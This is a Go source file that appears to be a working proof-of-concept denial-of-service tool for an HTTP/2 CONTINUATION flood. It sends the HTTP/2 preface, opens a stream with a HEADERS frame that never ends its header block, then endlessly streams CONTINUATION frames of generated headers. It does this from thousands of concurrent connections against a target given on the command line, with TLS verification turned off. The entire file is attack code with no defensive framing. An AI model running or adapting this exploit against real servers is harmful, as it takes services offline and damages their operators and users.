package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

func makeRandHeader(i int) []byte {
	var buf bytes.Buffer
	encoder := hpack.NewEncoder(&buf)

	hfield := hpack.HeaderField{
		Name:      fmt.Sprintf("aaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfg%d", i),
		Value:     fmt.Sprintf("iiiiiiiiiiiaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfgaaaaaouiehjbrbfg%d", i),
		Sensitive: true,
	}
	encoder.WriteField(hfield)

	buf_out := make([]byte, 1024)
	l, _ := buf.Read(buf_out)
	// fmt.Printf("%x\n", buf_out[0:l])

	return buf_out[0:l]
}

func readFrame(framer *http2.Framer) http2.Frame {
	fr, err := framer.ReadFrame()
	if err != nil {
		fmt.Println("readFrame")
		fmt.Println(err)
		return &http2.PingFrame{}
	}

	fmt.Println(fr)

	return fr
}

func DoS(target string, proto string) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("DoS tcp connect")
		fmt.Println(err)
		return
	}
	defer conn.Close()

	if proto == "https" {
		conf := &tls.Config{
			ServerName: strings.Split(target, ":")[0],
			InsecureSkipVerify: true,
		}
		conn = tls.Client(conn, conf)
	}

	framer := http2.NewFramer(conn, conn)
	conn.Write([]byte{
		'P', 'R', 'I', ' ', '*', ' ', 'H', 'T', 'T', 'P', '/', '2', '.', '0', '\r', '\n', '\r', '\n', 'S', 'M', '\r', '\n', '\r', '\n',
		0x00, 0x00, 0x12, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x64, 0x00, 0x04, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, //settings
		0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff, 0x00, 0x00, // window update
	})

	readFrame(framer) // settings
	framer.WriteSettingsAck()
	readFrame(framer) // window update
	readFrame(framer) // settings
	framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: []byte{0x82, 0x86, 0x41, 0x86, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0x84, 0x7a, 0x88, 0x25, 0xb6, 0x50, 0xc3, 0xcb, 0xb8, 0xb8, 0x3f, 0x53, 0x03, 0x2a, 0x2f, 0x2a},
		EndStream:     false,
		EndHeaders:    false,
		PadLength:     0,
		Priority: http2.PriorityParam{
			StreamDep: 0,
			Exclusive: true,
			Weight:    255,
		},
	})
	i := 0
	for {
		buf_out := makeRandHeader(i)

		framer.WriteContinuation(1, false, buf_out)
		i += 1
	}
}

func main() {
	var threads = flag.Int("i", 2048, "Number of threads to create.")
	var target = flag.String("t", "", "Target to DoS.")
	var tls = flag.String("p", "", "Protocol to use. https for TLS, http for no TLS")
	flag.Parse()
	if *target == "" || (*tls != "https" && *tls != "http") {
		log.Fatal("Please supply a target and a protocol.")
	}

	fmt.Println("starting")

	var wg sync.WaitGroup
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func(targ string, tls string) {
			defer wg.Done()
			DoS(targ, tls)
		}(*target, *tls)
	}

	wg.Wait()

	fmt.Println("done")
}
